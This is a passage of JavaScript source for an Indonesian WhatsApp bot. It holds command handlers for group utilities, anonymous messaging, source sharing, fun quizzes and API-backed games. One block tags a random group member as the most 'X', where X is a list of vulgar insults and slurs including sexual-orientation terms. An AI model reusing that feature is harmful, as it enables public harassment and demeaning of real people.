sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: mentionByReply } })
} else if (mentionByReply !== botNumber && isBotGroupAdmins) {
sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: mentionByReply } })
} else if (mentionByReply !== botNumber && !isBotGroupAdmins) {
await sock.chatModify({ clear: { messages: [{ id: m.quoted.id, fromMe: true, timestamp: m.messageTimestamp.low }] } }, m.chat, [])
}
break
case "react":{
if (m.isGroup && !isSewa) return onlySewa()
if (!mentionByReply) return setReply(mess.reply.message)
if (!allemojinya.includes(text)) return setReply(mess.cmd.react.query(prefix, command))
sock.sendMessage(m.chat, { react: { text: args[0], key: { remoteJid: m.chat, fromMe: true, id: m.quoted? m.quoted.id : m.id }}})
}
break
case "sewa":{
let teks = sewabot(m.pushName, ucapanWaktu)
let button = [{ buttonId: `${prefix}owner`, buttonText: { displayText: `ᴏᴡɴᴇʀ` }, type: 1 }]
sock.sendButLoc(m.chat, teks, copyrightnya, gfrply, button, { quoted: setQuoted })
}
break
case "readmore":{
if (m.isGroup && !isSewa) return onlySewa()
if (!text.split("|")[1]) return setReply(mess.cmd.readmore.query(prefix, command))
setReply(`${text.split("|")[0] + readmore + text.split("|")[1]}`)
}
break
case "infobotz":{
if (m.isGroup && !isSewa) return onlySewa()
let teks = `\`\`\`「  INFO BOTZ  」\`\`\`

▸ Bot Name : ${db.data.settings[botNumber].namabot}
▸ Bot Number : @${botNumber.split("@")[0]}
▸ Owner Number : @${ownerNumber}
▸ Devoloper Number : @${devoloperNumber}
▸ Owner Name : ${ownerName}
▸ Type Menu : ${db.data.settings[botNumber].setmenu}
▸ Type Doc : ${db.data.settings[botNumber].doctype}
▸ Type Quoted : ${db.data.settings[botNumber].quoted}
▸ Type Reply : ${db.data.settings[botNumber].replytype}
▸ Type Welcome : ${db.data.settings[botNumber].setwelcome}
▸ Type Prefix : ${thePrefix}
▸ Language : ${db.data.settings[botNumber].bahasa}

\`\`\`「  SECURITY BOT  」\`\`\`

▸ Auto Report : ${db.data.settings[botNumber].autoreport? "ON✅" : "OFF❌"}
▸ Auto Bio : ${db.data.settings[botNumber].autobio? "ON✅" : "OFF❌"}
▸ Auto Sticker : ${db.data.settings[botNumber].autosticker? "ON✅" : "OFF❌"}
▸ Auto Respon : ${db.data.settings[botNumber].autorespon? "ON✅" : "OFF❌"}
▸ Auto Read : ${db.data.settings[botNumber].autoread? "ON✅" : "OFF❌"}
▸ Auto Vn : ${db.data.settings[botNumber].autovn? "ON✅" : "OFF❌"}
▸ Auto Quoted : ${db.data.settings[botNumber].autoquoted? "ON✅" : "OFF❌"}
▸ Auto Button : ${db.data.settings[botNumber].autobutton? "ON✅" : "OFF❌"}
▸ Auto Join : ${db.data.settings[botNumber].autojoin? "ON✅" : "OFF❌"}
▸ Auto Block Commands : ${db.data.settings[botNumber].autoblockcmd? "ON✅" : "OFF❌"}
▸ Anti Spam : ${db.data.settings[botNumber].antispam? "ON✅" : "OFF❌"}
▸ Anti Call : ${db.data.settings[botNumber].anticall? "ON✅" : "OFF❌"}
`
setReply(teks) 
}
break
case "urltowebp":{
const { writeExifImg } = require("../../../ACTION/STORAGE/ACC/exif")
const path = isQuotedSticker? await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000)) : text
const buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await fetch(path)).buffer() : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
const toWebp = await writeExifImg(buff, { packname: "doge", author: "" })
const anu = await UploadFileUgu(toWebp)
await setReply(anu.url)
}
break
case "runtime":
if (m.isGroup && !isSewa) return onlySewa()
setReply(`${runtime(process.uptime())}`)
break
case "speed":{
if (m.isGroup && !isSewa) return onlySewa()
let timestamp = speed()
let latensi = speed() - timestamp
setReply(`Speed: ${latensi.toFixed(4)} Second`)
}
break
case "ping":{
if (m.isGroup && !isSewa) return onlySewa()
let timestamp = speed()
let latensi = speed() - timestamp
let neww = performance.now()
let oldd = performance.now()
let used = process.memoryUsage()
let cpus = os.cpus().map((cpu) => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce(
(last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
},
{
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0,
},
})
let respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length))," ")}: ${formatp(used[key])}`).join("\n")}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + "*").padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join("\n")}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + "*").padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join("\n")}`).join("\n\n")}` : ""}
`.trim()
setReply(respon)
}
break
case "listpc":{
if (m.isGroup && !isSewa) return onlySewa()
let anu = await store.chats.all().filter((v) => v.id.endsWith(".net")).map((v) => v.id)
let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
for (let x of anu) {
try{
var nama = db.data.users[x].name
} catch {
let nama = await sock.getName(x) 
}
teks += `◉ Nama : ${nama}\n◉ User : @${x.split("@")[0]}\n◉ Chat : https://wa.me/${x.split("@")[0]}\n\n────────────────────────\n\n`
}
setReply(teks)
}
break
case "listgc":{
if (m.isGroup && !isSewa) return onlySewa()
let getGroups = await sock.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await sock.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ Owner : ${metadata2.owner !== undefined ? "@" + metadata2.owner.split("@")[0] : "Tidak diketahui"}\n◉ ID : ${metadata2.id}\n◉ Dibuat : ${moment(metadata2.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
setReply(teks) 
}
break
case "cariteman":{
if (m.isGroup && !isSewa) return onlySewa()
let data = Object.keys(db.data.users)
let dapat = sock.pickRandom(data)
let name = db.data.users[dapat].name
let number = dapat.split("@")[0]
setTimeout(() => {
setReply(mess.cmd.cariteman.text1)
}, 1000)
setTimeout(() => {
setReply(mess.cmd.cariteman.text2)
}, 5000)
setTimeout(() => {
sock.sendContact(m.chat, number, name)
}, 9000)
}
break
case "kontak":{
if (m.isGroup && !isSewa) return onlySewa()
if (args[0] == "+62") return setReply(mess.cmd.kontak.query(prefix, command, numberQuery))
if (args[0] == "08") return setReply(mess.cmd.kontak.number)
if (mentionByReply && args[0]) {
await sock.sendContact(m.chat, mentionByReply.split("@")[0], args[0])
} else if (mentionByTag[0] && m.isGroup && args[1]) {
await sock.sendContact(m.chat, mentionByTag[0].split("@")[0], args[1])
} else if (!mentionByTag[0] && args[0] && args[1]) {
await sock.sendContact(m.chat, args[0], args[1])
} else if (mentionByReply && !args[0]) {
let nice = await sock.getName(Input)
await sock.sendContact(m.chat, mentionByReply.split("@")[0], nice)
} else if (mentionByTag[0] && m.isGroup && !args[1]) {
let nice = await sock.getName(Input)
await sock.sendContact(m.chat, mentionByTag[0].split("@")[0], nice)
} else if (!mentionByTag[0] && args[0] && !args[1]) {
let nice = await sock.getName(Input)
await sock.sendContact(m.chat, args[0], nice)
} else setReply(mess.input) 
}
break
case "getallstick":{
if (m.isGroup && !isSewa) return onlySewa()
let data = Object.keys(db.data.sticker)
for (let x of data) {
let url = db.data.sticker[x].url
sock.sendMessage(m.chat, { sticker: { url: url }}, { quoted: setQuoted })
}
}
break
case "menfes":{
if (m.isGroup && !isSewa) return onlySewa()
if (!text.split("|")[1]) return setReply(mess.cmd.menfes.query1(prefix, command, ownerNumber))
let nomor = text.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
if (text.split("|")[0] && text.split("|")[1]) {
if (sock.cekPengirimMenfes(m.sender, menfes)) return sock.sendButMessage(m.chat, mess.cmd.menfes.query2, copyrightnya, [{ buttonId: `${prefix + command} keluar pengirim`, buttonText: { displayText: "keluar" }, type: 1 }])
if (sock.cekPenerimaMenfes(m.sender, menfes)) return sock.sendButMessage(m.chat, mess.cmd.menfes.query2, copyrightnya, [{ buttonId: `${prefix + command} keluar penerima`, buttonText: { displayText: "keluar" }, type: 1 }])
sock.addMenfes(m.sender, nomor, menfes)
await sock.sendButMessage(nomor, 
`Halo kak kamu mendapatkan pesan rahasia nih\nDari seseorang yang mengenal kamu\nIsi Pesan : ${q.split("|")[1]}`, 
copyrightnya, [
{ buttonId: `${prefix + command} balas pesan`, buttonText: { displayText: "balas" }, type: 1 }, 
{ buttonId: `${prefix + command} keluar penerima`, buttonText: { displayText: "abaikan" }, type: 1 }]) 
setReply(mess.cmd.menfes.success1) 
} else if (args[0] == "balas" && args[1] == "pesan") {
if (!sock.cekPenerimaMenfes(m.sender, menfes)) return setReply(mess.cmd.menfes.query3) 
sock.setChatMenfes(m.sender, true, menfes) 
setReply(mess.cmd.menfes.success2) 
await sock.sendMessageV2(sock.getIdPengirimMenfes(m.sender, menfes), {contextInfo: { externalAdReply: { showAdAttribution: true, title: db.data.settings[botNumber].namabot, body: "DONT CLICK HERE", previewType: "PHOTO", thumbnail: kfrply, sourceUrl: `https://wa.me/${ownerNumber}?text=${db.data.settings[botNumber].textreply}` } }, text: mess.cmd.menfes.text1 })
} else if (args[0] == "keluar" && args[1] == "penerima") {
if (!sock.cekPenerimaMenfes(m.sender, menfes)) return setReply(mess.cmd.menfes.query3) 
setReply(mess.success)
await sock.sendMessageV2(getIdPengirimMenfes(sender), {contextInfo: { externalAdReply: { showAdAttribution: true, title: db.data.settings[botNumber].namabot, body: "DONT CLICK HERE", previewType: "PHOTO", thumbnail: kfrply, sourceUrl: `https://wa.me/${ownerNumber}?text=${db.data.settings[botNumber].textreply}` } }, text: mess.cmd.menfes.text2 })
setTimeout(() => { 
sock.delPenerimaMenfes(m.sender, menfes)
}, 1500) 
} else if (args[0] == "keluar" && args[1] == "pengirim" && !isGroup) {
if (!sock.cekPengirimMenfes(m.sender, menfes)) return setReply(mess.cmd.menfes.query4) 
setReply(mess.success)
await sock.sendMessageV2(sock.getIdPenerimaMenfes(m.sender, menfes), {contextInfo: { externalAdReply: { showAdAttribution: true, title: db.data.settings[botNumber].namabot, body: "DONT CLICK HERE", previewType: "PHOTO", thumbnail: kfrply, sourceUrl: `https://wa.me/${ownerNumber}?text=${db.data.settings[botNumber].textreply}` } }, text: mess.cmd.menfes.text3 })
setTimeout(() => { 
sock.delPengirimMenfes(m.sender, menfes)
}, 1500) 
} 
}
break
case "profile":{
if (m.isGroup && !isSewa) return onlySewa()
let sol = await sock.fetchStatus(m.sender)
let stst = sol.status == 401 ? "" : sol.status
let teks = `\`\`\`「  PROFILE USER  」\`\`\`

▸ Nama : ${m.pushName} 
▸ No : ${m.sender.split("@")[0]}
▸ Status : ${isDevoloper? "Devoloper" : isOwner? "Owner" : isPremium? "Premium" : "User"}
▸ Limit : ${isPremium? null : db.data.users[m.sender].limit}
▸ Saldo : Rp ${db.data.users[m.sender].balance}
▸ Level : ${userLevel}
▸ Pangkat : ${sock.levelRole(userLevel)}
▸ Exp : ${sock.userXp(userPersen)} ${userPersen}%
▸ Bio : ${stst}`
setReply(teks)
}
break
case "listonline":
try{
if (m.isGroup && !isSewa) return onlySewa()
let teks = "┌──⭓「 *LIST ONLINE* 」\n│\n"
if (m.isGroup) {
if (text.includes("https://chat.whatsapp.com/")) {
var nana = await sock.groupAcceptInvite(text.split("https://chat.whatsapp.com/")[1])
} else {
var nana = m.chat
}
let data = [...Object.keys(store.presences[nana]), botNumber]
for (let x of data) {
teks += `│⭔ @${x.split("@")[0]}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${data.length}*`
setReply(teks)
} else if (!m.isGroup) {
if (!text.includes("https://chat.whatsapp.com/")) return setReply(mess.cmd.listonline.query(prefix, command)) 
let nana = await sock.groupAcceptInvite(text.split("https://chat.whatsapp.com/")[1])
let data = [...Object.keys(store.presences[nana]), botNumber]
for (let x of data) {
teks += `│⭔ @${x.split("@")[0]}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${data.length}*`
setReply(teks)
}
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "sc":
case "script":
case "sourcecode":{
if (m.isGroup && !isSewa) return onlySewa()
if (m.isGroup) return setReply(mess.only.chats)
if (isDevoloper) {
let idnya = text? text : m.chat
setTimeout(() => {
fs.unlinkSync("./ACTION.zip")
}, 6000)
setTimeout(() => {
let teks = `*CARA PASANGNYA*\n
1. BUAT FOLDER BARU BEBAS APA SAJA 
2. EXTRA FILE ACTION DAN MASUKAN KE FOLDER YANG DI BUAT
3. TAMBAHKAN FILE (package.json) KE DALAM FOLDER YANG DI BUAT 
4. HAPUS SESSION DENGAB XARA PERGI KE FOLDER (ACTION => CONNECTION) 
5. INSTALL MODULE TERLEBIH DAHULU DENGAN CARA KETIK DI CONSOLE (yarn) 
6. TUNGGU SAMPAI SELESAI DAN SETELAH ITU KETIK DI CONSOLE (npm start) 
7. SCAN QR 
`
sock.sendMessage(idnya, { text: teks }) 
}, 5000)
setTimeout(() => {
sock.sendMessage(idnya, { document: fs.readFileSync("./package.json"), mimetype: "application/bin", fileName: "package.json" }, { quoted: setQuoted })
}, 4000)
setTimeout(() => {
sock.sendMessage(idnya, { document: fs.readFileSync("./ACTION.zip"), mimetype: "application/bin", fileName: "ACTION.zip" }, { quoted: setQuoted })
}, 3000)
setTimeout(() => {
exec("zip -r ./ACTION.zip ./ACTION", (err, stdout) => {
})
}, 1000)
sock.sendMessage(idnya, { text: "Devoloper bot telah memberikan izin untuk menyoba bot ini" }) 
} else {
setTimeout(() => {
sock.sendButMessage(devoloper, `Hai kak seseorang sedang meminta script bot apakah akan mengasih?`, copyrightnya, [{ buttonId: `${prefix + command} ${m.chat}`, buttonText: { displayText: "kasih" }, type: 1 }], setQuoted)
}, 1000)
setReply("Menunggu persetujuan devoloper bot......") 
}
}
break
case "ceklimit":
setReply(db.data.users[m.sender].limit) 
break
//=========================[ FITURE JADI BOT ]=========================\\
case "jadibot":{
if (m.isGroup && !isSewa) return onlySewa()
if (m.isGroup) return setReply(mess.only.chats)
jadibot(sock, m.chat)
}
break
case "stopjadibot":{
if (m.isGroup && !isSewa) return onlySewa()
if (m.isGroup) return setReply(mess.only.chats)
stopjadibot(sock, m.chat) 
}
break
case "deljadibot":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!Input) return setReply(mess.input)
let dataSesi = fs.readdirSync("./ACTION/CONNECTION/JADIBOT-SESSION")
let data = dataSesi.splice("@adiwajshing", dataSesi.length - 1)
if (!data.includes(Input.split("@")[0])) return setReply(mess.cmd.deljadibot.query)
stopjadibot(sock, Input) 
setReply(mess.cmd.deljadibot.text(Input))
}
break
case "clearalljadibot":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
let dataSesi = fs.readdirSync("./ACTION/CONNECTION/JADIBOT-SESSION")
let data = dataSesi.splice("@adiwajshing", dataSesi.length - 1)
if (data.length > 0) {
for (let x of data) {
rimraf.sync("./ACTION/CONNECTION/JADIBOT-SESSION/" + x)
}
setReply(mess.success)
} else setReply(mess.success)
}
break
case "listjadibot":{
if (m.isGroup && !isSewa) return onlySewa()
let dataSesi = fs.readdirSync("./ACTION/CONNECTION/JADIBOT-SESSION")
let data = dataSesi.splice("@adiwajshing", dataSesi.length - 1)
let teks = "┌──⭓「 *LIST JADI BOT* 」\n│\n"
for (let x of data) {
teks += `│⭔ @${x}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${data.length}*`
setReply(teks)
}
break
//=========================[ FITURE TAG ]=========================\\
case "memek":
case "bego":
case "goblok":
case "perawan":
case "babi":
case "tolol":
case "pintar":
case "asu":
case "gay":
case "lesby":
case "bajingan":
case "jancok":
case "anjing":
case "ngentot":
case "monyet":
case "mastah":
case "newbie":
case "bangsat":
case "bangke":
case "sange":
case "dakjal":
case "wibu":
case "puki":
case "pantek":{
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
let member = participants.map((u) => u.id)
let org = member[Math.floor(Math.random() * member.length)]
setReply(`yang paling ${command} di sini adalah @${org.split("@")[0]}`) 
}
break
case "jadian":{
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
let member = participants.map((u) => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let teks = `Ciee Yang Jadian💖 Jangan Lupa Pajak Jadiannya Yaa🐤

@${orang.split("@")[0]} ❤️ @${jodoh.split("@")[0]}`
setReply(teks) 
}
break
case "jodohku":{
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
let member = participants.map((u) => u.id)
let jodoh = member[Math.floor(Math.random() * member.length)]
let teks = `jodoh kamu adalah @${jodoh.split("@")[0]}`
setReply(teks) 
}
break
case "tagme":{
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
setReply(`@${m.sender.split("@")[0]}`) 
}
break
case "totag":{
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!mentionByReply) return setReply(mess.reply.message)
setReply(`@${mentionByReply.split("@")[0]}`) 
}
break
case "reqtag":{
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!mentionByReply) return setReply(mess.reply.message)
if (!text) return setReply(mess.query.text)
setReply(`${text} @${mentionByReply.split("@")[0]}`) 
}
break
//=========================[ FITURE FUN ]=========================\\
case "katailham":{
if (m.isGroup && !isSewa) return onlySewa()
const afa = ilhamberkata[Math.floor(Math.random() * ilhamberkata.length)]
sock.sendMessage(m.chat, { text: "" + afa + "\n\n_-Ilham._" }, { quoted: setQuoted })
}
break
case "truth":{
if (m.isGroup && !isSewa) return onlySewa()
const ttrth = trut[Math.floor(Math.random() * trut.length)]
setReply(ttrth)
}
break
case "dare":{
if (m.isGroup && !isSewa) return onlySewa()
const der = dare[Math.floor(Math.random() * dare.length)]
setReply(der)
}
break
case "bisakah":{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.query.text)
const keh = bisa[Math.floor(Math.random() * bisa.length)]
let teks = `${command} ${text}`
sock.sendMessage(m.chat, { text: "Pertanyaan : *" + teks + "*\n\nJawaban : " + keh }, { quoted: setQuoted })
}
break
case "kapankah":{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.query.text)
const koh = kapan[Math.floor(Math.random() * kapan.length)]
let teks = `${command} ${text}`
sock.sendMessage(m.chat, { text: "Pertanyaan : *" + teks + "*\n\nJawaban : " + koh }, { quoted: setQuoted })
}
break
case "apakah":{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.query.text)
const kah = apa[Math.floor(Math.random() * apa.length)]
let teks = `${command} ${text}`
sock.sendMessage(m.chat, { text: "Pertanyaan : *" + teks + "*\n\nJawaban : " + kah }, { quoted: setQuoted })
}
break
case "bagaimanakah":{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.query.text)
const mana = bagai[Math.floor(Math.random() * bagai.length)]
let teks = `${command} ${text}`
sock.sendMessage(m.chat, { text: "Pertanyaan : *" + teks + "*\n\nJawaban : " + mana }, { quoted: setQuoted })
}
break
case "rate":
case "cekgoblok":
case "cekjelek":
case "cekgay":                
case "ceklesbi":
case "cekganteng":
case "cekcantik":
case "cekbego":
case "ceksuhu":
case "cekpinter":
case "cekjago":
case "ceknolep":
case "cekbabi":
case "cekbeban":
case "cekbaik":
case "cekjahat":
case "cekanjing":
case "cekharam":
case "cekpakboy":
case "cekpakgirl":
case "ceksange":
case "cekbaper":
case "cekfakboy":
case "cekalim":
case "ceksuhu":
case "cekfakgirl":
case "cekkeren":
case "cekwibu":
case "cekpasarkas":
case "cekkul":
if (m.isGroup && !isSewa) return onlySewa()
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
let teks = "Pertanyaan : *" + command + "*\nNomer : " + `@${mentionByReply.split("@")[0]}` + "\nJawaban : " + cek2 + "%"
setReply(teks) 
} else if (mentionByTag[0] && m.isGroup) {
let teks = "Pertanyaan : *" + command + "*\nNomer : " + `@${mentionByTag[0].split("@")[0]}` + "\nJawaban : " + cek2 + "%"
setReply(teks) 
} else {
let teks = "Pertanyaan : *" + command + "*\nNomer : " + `@${m.sender.split("@")[0]}` + "\nJawaban : " + cek2 + "%"
setReply(teks) 
}
break
case "cekwatak":
if (m.isGroup && !isSewa) return onlySewa()
const tak = wa[Math.floor(Math.random() * wa.length)]
if (mentionByReply) {
let teks = "Pertanyaan : *" + command + "*\nNomer : " + `@${mentionByReply.split("@")[0]}` + "\nJawaban : " + tak
setReply(teks) 
} else if (mentionByTag[0] && m.isGroup) {
let teks = "Pertanyaan : *" + command + "*\nNomer : " + `@${mentionByTag[0].split("@")[0]}` + "\nJawaban : " + tak
setReply(teks) 
} else {
let teks = "Pertanyaan : *" + command + "*\nNomer : " + `@${m.sender.split("@")[0]}` + "\nJawaban : " + tak
setReply(teks) 
}
break
case "cekhobby":
if (m.isGroup && !isSewa) return onlySewa()
const by = hob[Math.floor(Math.random() * hob.length)]
if (mentionByReply) {
let teks = "Pertanyaan : *" + command + "*\nNomer : " + `@${mentionByReply.split("@")[0]}` + "\nJawaban : " + by
setReply(teks) 
} else if (mentionByTag[0] && m.isGroup) {
let teks = "Pertanyaan : *" + command + "*\nNomer : " + `@${mentionByTag[0].split("@")[0]}` + "\nJawaban : " + by
setReply(teks) 
} else {
let teks = "Pertanyaan : *" + command + "*\nNomer : " + `@${m.sender.split("@")[0]}` + "\nJawaban : " + by
setReply(teks) 
}
break
case "halah":
case "hilih":
case "huluh":
case "heleh":
case "holoh":{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.query.text)
let ter = command[1].toLowerCase()
let tex = m.quoted ? (m.quoted.text ? m.quoted.text : text ? text : m.text) : text ? text : m.text
setReply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
}
break
case "faktaunik":
case "katabijak":
case "bucin":
case "katabucin":
case "pantun":
case "puisi":
case "quotes":
case "quotesnime":
try{
if (m.isGroup && !isSewa) return onlySewa()
let { data } = await axios.get(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolhumankey}`)
if (command == "quotes") {
let teks = `⭔ *By* : ${data.result.by}\n`
teks += `⭔ *Quotes* : ${data.result.quote}`
setReply(teks) 
} else if (command == "quotesnime") {
let teks = `⭔ *Character* : ${data.result.character}\n`
teks += `⭔ *Anime* : ${data.result.anime}\n`
teks += `⭔ *Episode* : ${data.result.episode}\n`
teks += `⭔ *Quotes* : ${data.result.quote}`
setReply(teks) 
} else setReply(data.result)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "quotesimage":
try{
if (m.isGroup && !isSewa) return onlySewa()
sock.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random/quotesimage?apikey=${lolhumankey}` }}, { quoted: setQuoted }) 
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "bahasapurba": 
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.query.text)
let { data } = axios.get(`https://api.lolhuman.xyz/api/bahasapurba?apikey=${lolhumankey}&text=${encodeURI(text)}`) 
setReply(data.result) 
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "nulis":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.query.text)
sock.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/nulis?apikey=${lolhumankey}&text=${encodeURI}` }, caption: mess.success }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
//=========================[ FITURE GAME ]=========================\\
case "akinator":
if (m.isGroup && !isSewa) return onlySewa()
if (!text.split("|")[0] && !text.split("|")[1] && !text.split("|")[2] && !text.split("|")[3] && !text.split("|")[4] && !text.split("|")[5]) {
require("../../../ACTION/STORAGE/APP/GAME/AKINATOR/akinatorStart")(sock, m, prefix, command, setReply, setQuoted)
} else if (text.split("|")[0] && text.split("|")[1] && text.split("|")[2] && text.split("|")[3] && text.split("|")[4] && text.split("|")[5] !== "5") {
require("../../../ACTION/STORAGE/APP/GAME/AKINATOR/akinatorAnswer")(sock, m, text, prefix, command, setReply, setQuoted)
} else if (text.split("|")[0] && text.split("|")[1] && text.split("|")[2] && text.split("|")[3] && text.split("|")[4] && text.split("|")[5] == "5") {
require("../../../ACTION/STORAGE/APP/GAME/AKINATOR/akinatorBack")(sock, m, text, prefix, command, setReply, setQuoted)
}
break
case "caklontong":
case "family100":
case "siapaaku":
case "susunkata":
case "tebakbendera":
case "tebakgambar":
case "tebakkata":
case "tebaklirik":
case "tebakjenaka":
try{
if (command == "caklontong") {
if (db.data.users[m.sender].game.caklontong.status) return setReply(mess.cmd.game.query)
let { data } = await axios.get(`https://api.lolhuman.xyz/api/tebak/caklontong2?apikey=${lolhumankey}`) 
db.data.users[m.sender].game.caklontong = {
status: true,
expired: Date.now() + toMs(gameWaktu + "s"),
pertanyaan: data.result.question, 
jawaban: data.result.answer
}
setReply(`Pertanyaan : ${data.result.question}\nWaktu : ${gameWaktu} ${mess.time.seconds}`)
} else if (command == "family100") {
if (db.data.users[m.sender].game.family100.status) return setReply(mess.cmd.game.query)
let { data } = await axios.get(`https://api.lolhuman.xyz/api/tebak/family100?apikey=${lolhumankey}`) 
db.data.users[m.sender].game.family100 = {
status: true,
expired: Date.now() + toMs(gameWaktu + "s"),
pertanyaan: data.result.question, 
jawaban: data.result.answer
}
setReply(`Pertanyaan : ${data.result.question}\nWaktu : ${gameWaktu} ${mess.time.seconds}`)
} else if (command == "siapaaku") {
if (db.data.users[m.sender].game.siapaaku.status) return setReply(mess.cmd.game.query)
let { data } = await axios.get(`https://api.lolhuman.xyz/api/tebak/siapaaku?apikey=${lolhumankey}`) 
db.data.users[m.sender].game.siapaaku = {
status: true,
expired: Date.now() + toMs(gameWaktu + "s"),
pertanyaan: data.result.question, 
jawaban: data.result.answer
}
setReply(`Pertanyaan : ${data.result.question}\nWaktu : ${gameWaktu} ${mess.time.seconds}`)
} else if (command == "susunkata") {
if (db.data.users[m.sender].game.susunkata.status) return setReply(mess.cmd.game.query)
let { data } = await axios.get(`https://api.lolhuman.xyz/api/tebak/susunkata?apikey=${lolhumankey}`) 
db.data.users[m.sender].game.susunkata = {
status: true,
expired: Date.now() + toMs(gameWaktu + "s"),
pertanyaan: data.result.pertanyaan, 
jawaban: data.result.jawaban
}
setReply(`Pertanyaan : ${data.result.pertanyaan}\nWaktu : ${gameWaktu} ${mess.time.seconds}`)
} else if (command == "tebakbendera") {
if (db.data.users[m.sender].game.tebakbendera.status) return setReply(mess.cmd.game.query)
let { data } = await axios.get(`https://api.lolhuman.xyz/api/tebak/bendera?apikey=${lolhumankey}`) 
db.data.users[m.sender].game.tebakbendera = {
status: true,
expired: Date.now() + toMs(gameWaktu + "s"),
pertanyaan: data.result.flag, 
jawaban: data.result.name
}
setReply(`Pertanyaan : ${data.result.flag}\nWaktu : ${gameWaktu} ${mess.time.seconds}`)
} else if (command == "tebakgambar") {
if (db.data.users[m.sender].game.tebakgambar.status) return setReply(mess.cmd.game.query)
let { data } = await axios.get(`https://api.lolhuman.xyz/api/tebak/gambar?apikey=${lolhumankey}`) 
db.data.users[m.sender].game.tebakgambar = {
status: true,
expired: Date.now() + toMs(gameWaktu + "s"),
pertanyaan: data.result.image, 
jawaban: data.result.answer
}
sock.sendMessage(m.chat, { image: { url: data.result.image }, caption: `Waktu : ${gameWaktu} ${mess.time.seconds}` }, { quoted: setQuoted })
} else if (command == "tebakkata") {
